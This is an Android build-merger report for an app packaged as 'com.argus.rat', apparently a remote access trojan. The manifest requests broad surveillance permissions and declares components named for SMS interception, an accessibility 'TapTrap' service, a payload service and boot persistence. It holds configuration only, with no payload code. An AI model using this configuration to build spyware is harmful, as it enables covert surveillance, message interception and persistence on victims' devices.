android/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.argus.rat.debug"
4    android:versionCode="20"
5    android:versionName="2.0" >
6
7    <uses-sdk
8        android:minSdkVersion="21"
9        android:targetSdkVersion="34" />
10
11    <!-- ======================== PERMISSIONS ======================== -->
12
13
14    <!-- Permissões de rede -->
15    <uses-feature
15-->src\main\AndroidManifest.xml:9:5-11:36
16        android:name="android.hardware.telephony"
16-->src\main\AndroidManifest.xml:10:9-50
17        android:required="false" />
17-->src\main\AndroidManifest.xml:11:9-33
18    <uses-feature
18-->src\main\AndroidManifest.xml:12:5-14:36
19        android:name="android.hardware.camera"
19-->src\main\AndroidManifest.xml:13:9-47
20        android:required="false" />
20-->src\main\AndroidManifest.xml:14:9-33
21
22    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
22-->src\main\AndroidManifest.xml:15:5-79
22-->src\main\AndroidManifest.xml:15:22-76
23    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
23-->src\main\AndroidManifest.xml:17:5-87
23-->src\main\AndroidManifest.xml:17:22-84
24    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
24-->src\main\AndroidManifest.xml:18:5-86
24-->src\main\AndroidManifest.xml:18:22-83
25    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" />
25-->src\main\AndroidManifest.xml:19:5-92
25-->src\main\AndroidManifest.xml:19:22-89
26    <uses-permission android:name="android.permission.INTERNET" />
26-->src\main\AndroidManifest.xml:21:5-67
26-->src\main\AndroidManifest.xml:21:22-64
27    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
27-->src\main\AndroidManifest.xml:22:5-79
27-->src\main\AndroidManifest.xml:22:22-76
28    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
28-->src\main\AndroidManifest.xml:23:5-79
28-->src\main\AndroidManifest.xml:23:22-76
29    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
29-->src\main\AndroidManifest.xml:24:5-76
29-->src\main\AndroidManifest.xml:24:22-73
30    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
30-->src\main\AndroidManifest.xml:25:5-76
30-->src\main\AndroidManifest.xml:25:22-73
31
32    <!-- Permissões de SMS -->
33    <uses-permission android:name="android.permission.SEND_SMS" />
33-->src\main\AndroidManifest.xml:28:5-29:40
33-->src\main\AndroidManifest.xml:28:22-64
34    <uses-permission android:name="android.permission.RECEIVE_SMS" />
34-->src\main\AndroidManifest.xml:30:5-70
34-->src\main\AndroidManifest.xml:30:22-67
35    <uses-permission android:name="android.permission.READ_SMS" />
35-->src\main\AndroidManifest.xml:31:5-67
35-->src\main\AndroidManifest.xml:31:22-64
36    <uses-permission android:name="android.permission.RECEIVE_MMS" />
36-->src\main\AndroidManifest.xml:32:5-70
36-->src\main\AndroidManifest.xml:32:22-67
37    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
37-->src\main\AndroidManifest.xml:33:5-75
37-->src\main\AndroidManifest.xml:33:22-72
38
39    <!-- Permissões de localização -->
40    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
40-->src\main\AndroidManifest.xml:36:5-79
40-->src\main\AndroidManifest.xml:36:22-76
41    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
41-->src\main\AndroidManifest.xml:37:5-81
41-->src\main\AndroidManifest.xml:37:22-78
42    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
42-->src\main\AndroidManifest.xml:38:5-85
42-->src\main\AndroidManifest.xml:38:22-82
43
44    <!-- Permissões de câmera e microfone -->
45    <uses-permission android:name="android.permission.CAMERA" />
45-->src\main\AndroidManifest.xml:41:5-65
45-->src\main\AndroidManifest.xml:41:22-62
46    <uses-permission android:name="android.permission.RECORD_AUDIO" />
46-->src\main\AndroidManifest.xml:42:5-71
46-->src\main\AndroidManifest.xml:42:22-68
47
48    <!-- Permissões de armazenamento -->
49    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
49-->src\main\AndroidManifest.xml:45:5-80
49-->src\main\AndroidManifest.xml:45:22-77
50    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
50-->src\main\AndroidManifest.xml:46:5-81
50-->src\main\AndroidManifest.xml:46:22-78
51    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
51-->src\main\AndroidManifest.xml:47:5-82
51-->src\main\AndroidManifest.xml:47:22-79
52
53    <!-- Permissões de contatos -->
54    <uses-permission android:name="android.permission.READ_CONTACTS" />
54-->src\main\AndroidManifest.xml:50:5-72
54-->src\main\AndroidManifest.xml:50:22-69
55    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
55-->src\main\AndroidManifest.xml:51:5-73
55-->src\main\AndroidManifest.xml:51:22-70
56    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
56-->src\main\AndroidManifest.xml:52:5-71
56-->src\main\AndroidManifest.xml:52:22-68
57
58    <!-- Permissões de chamadas -->
59    <uses-permission android:name="android.permission.CALL_PHONE" />
59-->src\main\AndroidManifest.xml:55:5-69
59-->src\main\AndroidManifest.xml:55:22-66
60    <uses-permission android:name="android.permission.READ_CALL_LOG" />
60-->src\main\AndroidManifest.xml:56:5-72
60-->src\main\AndroidManifest.xml:56:22-69
61    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
61-->src\main\AndroidManifest.xml:57:5-73
61-->src\main\AndroidManifest.xml:57:22-70
62    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
62-->src\main\AndroidManifest.xml:58:5-81
62-->src\main\AndroidManifest.xml:58:22-78
63
64    <!-- Permissões de sistema -->
65    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
65-->src\main\AndroidManifest.xml:61:5-81
65-->src\main\AndroidManifest.xml:61:22-78
66    <uses-permission android:name="android.permission.WAKE_LOCK" />
66-->src\main\AndroidManifest.xml:62:5-68
66-->src\main\AndroidManifest.xml:62:22-65
67    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
67-->src\main\AndroidManifest.xml:63:5-95
67-->src\main\AndroidManifest.xml:63:22-92
68    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
68-->src\main\AndroidManifest.xml:64:5-77
68-->src\main\AndroidManifest.xml:64:22-74
69    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
69-->src\main\AndroidManifest.xml:65:5-78
69-->src\main\AndroidManifest.xml:65:22-75
70    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
70-->src\main\AndroidManifest.xml:66:5-73
70-->src\main\AndroidManifest.xml:66:22-70
71
72    <!-- Permissões de acessibilidade -->
73    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
73-->src\main\AndroidManifest.xml:69:5-70:47
73-->src\main\AndroidManifest.xml:69:22-82
74
75    <!-- Permissões de notificações -->
76    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
76-->src\main\AndroidManifest.xml:73:5-74:47
76-->src\main\AndroidManifest.xml:73:22-90
77
78    <!-- Permissões de administrador de dispositivo -->
79    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
79-->src\main\AndroidManifest.xml:77:5-78:47
79-->src\main\AndroidManifest.xml:77:22-73
80
81    <!-- Permissões Android 13+ -->
82    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
82-->src\main\AndroidManifest.xml:81:5-77
82-->src\main\AndroidManifest.xml:81:22-74
83    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
83-->src\main\AndroidManifest.xml:82:5-76
83-->src\main\AndroidManifest.xml:82:22-73
84    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
84-->src\main\AndroidManifest.xml:83:5-75
84-->src\main\AndroidManifest.xml:83:22-72
85    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
85-->src\main\AndroidManifest.xml:84:5-75
85-->src\main\AndroidManifest.xml:84:22-72
86
87    <permission
87-->[androidx.core:core:1.12.0] AndroidManifest.xml:22:5-24:47
88        android:name="com.argus.rat.debug.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
88-->[androidx.core:core:1.12.0] AndroidManifest.xml:23:9-81
89        android:protectionLevel="signature" />
89-->[androidx.core:core:1.12.0] AndroidManifest.xml:24:9-44
90
91    <uses-permission android:name="com.argus.rat.debug.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
91-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:5-97
91-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:22-94
92
93    <application
93-->src\main\AndroidManifest.xml:86:5-183:19
94        android:allowBackup="false"
94-->src\main\AndroidManifest.xml:87:9-36
95        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
95-->[androidx.core:core:1.12.0] AndroidManifest.xml:28:18-86
96        android:debuggable="true"
97        android:extractNativeLibs="true"
98        android:icon="@drawable/ic_android_black_24dp"
98-->src\main\AndroidManifest.xml:88:9-55
99        android:label="@string/app_name"
99-->src\main\AndroidManifest.xml:89:9-41
100        android:requestLegacyExternalStorage="true"
100-->src\main\AndroidManifest.xml:94:9-52
101        android:roundIcon="@drawable/ic_android_black_24dp"
101-->src\main\AndroidManifest.xml:90:9-60
102        android:supportsRtl="true"
102-->src\main\AndroidManifest.xml:91:9-35
103        android:testOnly="true"
104        android:theme="@android:style/Theme.Material.Light"
104-->src\main\AndroidManifest.xml:92:9-60
105        android:usesCleartextTraffic="true" >
105-->src\main\AndroidManifest.xml:93:9-44
106
107        <!-- ======================== MAIN ACTIVITY ======================== -->
108        <activity
108-->src\main\AndroidManifest.xml:97:9-106:20
109            android:name="com.argus.rat.MainActivity"
109-->src\main\AndroidManifest.xml:98:13-41
110            android:exported="true"
110-->src\main\AndroidManifest.xml:99:13-36
111            android:launchMode="singleTask"
111-->src\main\AndroidManifest.xml:100:13-44
112            android:screenOrientation="portrait" >
112-->src\main\AndroidManifest.xml:101:13-49
113            <intent-filter>
113-->src\main\AndroidManifest.xml:102:13-105:29
114                <action android:name="android.intent.action.MAIN" />
114-->src\main\AndroidManifest.xml:103:17-69
114-->src\main\AndroidManifest.xml:103:25-66
115
116                <category android:name="android.intent.category.LAUNCHER" />
116-->src\main\AndroidManifest.xml:104:17-77
116-->src\main\AndroidManifest.xml:104:27-74
117            </intent-filter>
118        </activity>
119
120        <!-- ======================== SERVICES ======================== -->
121
122
123        <!-- Serviço persistente principal -->
124        <service
124-->src\main\AndroidManifest.xml:111:9-116:58
125            android:name="com.argus.rat.PersistentService"
125-->src\main\AndroidManifest.xml:112:13-46
126            android:enabled="true"
126-->src\main\AndroidManifest.xml:113:13-35
127            android:exported="false"
127-->src\main\AndroidManifest.xml:114:13-37
128            android:foregroundServiceType="dataSync" />
128-->src\main\AndroidManifest.xml:115:13-53
129
130        <!-- Serviço de payload (operações em background) -->
131        <service
131-->src\main\AndroidManifest.xml:119:9-122:40
132            android:name="com.argus.rat.PayloadService"
132-->src\main\AndroidManifest.xml:120:13-43
133            android:enabled="true"
133-->src\main\AndroidManifest.xml:121:13-35
134            android:exported="false" />
134-->src\main\AndroidManifest.xml:122:13-37
135
136        <!-- Serviço de monitoramento de notificações -->
137        <service
137-->src\main\AndroidManifest.xml:125:9-133:19
138            android:name="com.argus.rat.NotificationService"
138-->src\main\AndroidManifest.xml:126:13-48
139            android:exported="true"
139-->src\main\AndroidManifest.xml:129:13-36
140            android:label="@string/notification_service_label"
140-->src\main\AndroidManifest.xml:127:13-63
141            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
141-->src\main\AndroidManifest.xml:128:13-87
142            <intent-filter>
142-->src\main\AndroidManifest.xml:130:13-132:29
143                <action android:name="android.service.notification.NotificationListenerService" />
143-->src\main\AndroidManifest.xml:131:17-99
143-->src\main\AndroidManifest.xml:131:25-96
144            </intent-filter>
145        </service>
146
147        <!-- Serviço de acessibilidade (TapTrap) -->
148        <service
148-->src\main\AndroidManifest.xml:136:9-147:19
149            android:name="com.argus.rat.AccessibilityTapTrapService"
149-->src\main\AndroidManifest.xml:137:13-56
150            android:exported="true"
150-->src\main\AndroidManifest.xml:140:13-36
151            android:label="@string/accessibility_service_label"
151-->src\main\AndroidManifest.xml:138:13-64
152            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
152-->src\main\AndroidManifest.xml:139:13-79
153            <intent-filter>
153-->src\main\AndroidManifest.xml:141:13-143:29
154                <action android:name="android.accessibilityservice.AccessibilityService" />
154-->src\main\AndroidManifest.xml:142:17-92
154-->src\main\AndroidManifest.xml:142:25-89
155            </intent-filter>
156
157            <meta-data
157-->src\main\AndroidManifest.xml:144:13-146:72
158                android:name="android.accessibilityservice"
158-->src\main\AndroidManifest.xml:145:17-60
159                android:resource="@xml/accessibility_service_config" />
159-->src\main\AndroidManifest.xml:146:17-69
160        </service>
161
162        <!-- ======================== RECEIVERS ======================== -->
163
164
165        <!-- Receiver de boot completo (persistência) -->
166        <receiver
166-->src\main\AndroidManifest.xml:152:9-163:20
167            android:name="com.argus.rat.BootCompleteReceiver"
167-->src\main\AndroidManifest.xml:153:13-49
168            android:enabled="true"
168-->src\main\AndroidManifest.xml:154:13-35
169            android:exported="true"
169-->src\main\AndroidManifest.xml:155:13-36
170            android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
170-->src\main\AndroidManifest.xml:156:13-75
171            <intent-filter android:priority="999" >
171-->src\main\AndroidManifest.xml:157:13-162:29
171-->src\main\AndroidManifest.xml:157:28-50
172                <action android:name="android.intent.action.BOOT_COMPLETED" />
172-->src\main\AndroidManifest.xml:158:17-79
172-->src\main\AndroidManifest.xml:158:25-76
173                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
173-->src\main\AndroidManifest.xml:159:17-82
173-->src\main\AndroidManifest.xml:159:25-79
174                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
174-->src\main\AndroidManifest.xml:160:17-86
174-->src\main\AndroidManifest.xml:160:25-83
175                <action android:name="android.intent.action.REBOOT" />
175-->src\main\AndroidManifest.xml:161:17-71
175-->src\main\AndroidManifest.xml:161:25-68
176            </intent-filter>
177        </receiver>
178
179        <!-- Receiver de reinicialização de serviço -->
180        <receiver
180-->src\main\AndroidManifest.xml:166:9-169:40
181            android:name="com.argus.rat.ServiceRestarterReceiver"
181-->src\main\AndroidManifest.xml:167:13-53
182            android:enabled="true"
182-->src\main\AndroidManifest.xml:168:13-35
183            android:exported="false" />
183-->src\main\AndroidManifest.xml:169:13-37
184
185        <!-- Receiver de SMS -->
186        <receiver
186-->src\main\AndroidManifest.xml:172:9-181:20
187            android:name="com.argus.rat.SmsInterceptor"
187-->src\main\AndroidManifest.xml:173:13-43
188            android:enabled="true"
188-->src\main\AndroidManifest.xml:174:13-35
189            android:exported="true"
189-->src\main\AndroidManifest.xml:175:13-36
190            android:permission="android.permission.BROADCAST_SMS" >
190-->src\main\AndroidManifest.xml:176:13-66
191            <intent-filter android:priority="999" >
191-->src\main\AndroidManifest.xml:177:13-180:29
191-->src\main\AndroidManifest.xml:177:28-50
192                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
192-->src\main\AndroidManifest.xml:178:17-82
192-->src\main\AndroidManifest.xml:178:25-79
193                <action android:name="android.provider.Telephony.SMS_DELIVER" />
193-->src\main\AndroidManifest.xml:179:17-81
193-->src\main\AndroidManifest.xml:179:25-78
194            </intent-filter>
195        </receiver>
196
197        <provider
197-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:29:9-37:20
198            android:name="androidx.startup.InitializationProvider"
198-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:30:13-67
199            android:authorities="com.argus.rat.debug.androidx-startup"
199-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:31:13-68
200            android:exported="false" >
200-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:32:13-37
201            <meta-data
201-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:34:13-36:52
202                android:name="androidx.work.WorkManagerInitializer"
202-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:35:17-68
203                android:value="androidx.startup" />
203-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:36:17-49
204            <meta-data
204-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
205                android:name="androidx.emoji2.text.EmojiCompatInitializer"
205-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
206                android:value="androidx.startup" />
206-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
207            <meta-data
207-->[androidx.lifecycle:lifecycle-process:2.6.2] AndroidManifest.xml:29:13-31:52
208                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
208-->[androidx.lifecycle:lifecycle-process:2.6.2] AndroidManifest.xml:30:17-78
209                android:value="androidx.startup" />
209-->[androidx.lifecycle:lifecycle-process:2.6.2] AndroidManifest.xml:31:17-49
210            <meta-data
210-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
211                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
211-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
212                android:value="androidx.startup" />
212-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
213        </provider>
214
215        <service
215-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:39:9-45:35
216            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
216-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:40:13-88
217            android:directBootAware="false"
217-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:41:13-44
218            android:enabled="@bool/enable_system_alarm_service_default"
218-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:42:13-72
219            android:exported="false" />
219-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:43:13-37
220        <service
220-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:46:9-52:35
221            android:name="androidx.work.impl.background.systemjob.SystemJobService"
221-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:47:13-84
222            android:directBootAware="false"
222-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:48:13-44
223            android:enabled="@bool/enable_system_job_service_default"
223-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:49:13-70
224            android:exported="true"
224-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:50:13-36
225            android:permission="android.permission.BIND_JOB_SERVICE" />
225-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:51:13-69
226        <service
226-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:53:9-59:35
227            android:name="androidx.work.impl.foreground.SystemForegroundService"
227-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:54:13-81
228            android:directBootAware="false"
228-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:55:13-44
229            android:enabled="@bool/enable_system_foreground_service_default"
229-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:56:13-77
230            android:exported="false" />
230-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:57:13-37
231
232        <receiver
232-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:61:9-66:35
233            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
233-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:62:13-88
234            android:directBootAware="false"
234-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:63:13-44
235            android:enabled="true"
235-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:64:13-35
236            android:exported="false" />
236-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:65:13-37
237        <receiver
237-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:67:9-77:20
238            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
238-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:68:13-106
239            android:directBootAware="false"
239-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:69:13-44
240            android:enabled="false"
240-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:70:13-36
241            android:exported="false" >
241-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:71:13-37
242            <intent-filter>
242-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:73:13-76:29
243                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
243-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:17-87
243-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:25-84
244                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
244-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:17-90
244-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:25-87
245            </intent-filter>
246        </receiver>
247        <receiver
247-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:78:9-88:20
248            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
248-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:79:13-104
249            android:directBootAware="false"
249-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:80:13-44
250            android:enabled="false"
250-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:81:13-36
251            android:exported="false" >
251-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:82:13-37
252            <intent-filter>
252-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:84:13-87:29
253                <action android:name="android.intent.action.BATTERY_OKAY" />
253-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:17-77
253-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:25-74
254                <action android:name="android.intent.action.BATTERY_LOW" />
254-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:17-76
254-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:25-73
255            </intent-filter>
256        </receiver>
257        <receiver
257-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:89:9-99:20
258            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
258-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:90:13-104
259            android:directBootAware="false"
259-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:91:13-44
260            android:enabled="false"
260-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:92:13-36
261            android:exported="false" >
261-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:93:13-37
262            <intent-filter>
262-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:95:13-98:29
263                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
263-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:17-83
263-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:25-80
264                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
264-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:17-82
264-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:25-79
265            </intent-filter>
266        </receiver>
267        <receiver
267-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:100:9-109:20
268            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
268-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:101:13-103
269            android:directBootAware="false"
269-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:102:13-44
270            android:enabled="false"
270-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:103:13-36
271            android:exported="false" >
271-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:104:13-37
272            <intent-filter>
272-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:106:13-108:29
273                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
273-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:17-79
273-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:25-76
274            </intent-filter>
275        </receiver>
276        <receiver
276-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:110:9-121:20
277            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
277-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:111:13-88
278            android:directBootAware="false"
278-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:112:13-44
279            android:enabled="false"
279-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:113:13-36
280            android:exported="false" >
280-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:114:13-37
281            <intent-filter>
281-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:116:13-120:29
282                <action android:name="android.intent.action.BOOT_COMPLETED" />
282-->src\main\AndroidManifest.xml:158:17-79
282-->src\main\AndroidManifest.xml:158:25-76
283                <action android:name="android.intent.action.TIME_SET" />
283-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:17-73
283-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:25-70
284                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
284-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:17-81
284-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:25-78
285            </intent-filter>
286        </receiver>
287        <receiver
287-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:122:9-131:20
288            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
288-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:123:13-99
289            android:directBootAware="false"
289-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:124:13-44
290            android:enabled="@bool/enable_system_alarm_service_default"
290-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:125:13-72
291            android:exported="false" >
291-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:126:13-37
292            <intent-filter>
292-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:128:13-130:29
293                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
293-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:17-98
293-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:25-95
294            </intent-filter>
295        </receiver>
296        <receiver
296-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:132:9-142:20
297            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
297-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:133:13-78
298            android:directBootAware="false"
298-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:134:13-44
299            android:enabled="true"
299-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:135:13-35
300            android:exported="true"
300-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:136:13-36
301            android:permission="android.permission.DUMP" >
301-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:137:13-57
302            <intent-filter>
302-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:139:13-141:29
303                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
303-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:17-88
303-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:25-85
304            </intent-filter>
305        </receiver>
306
307        <activity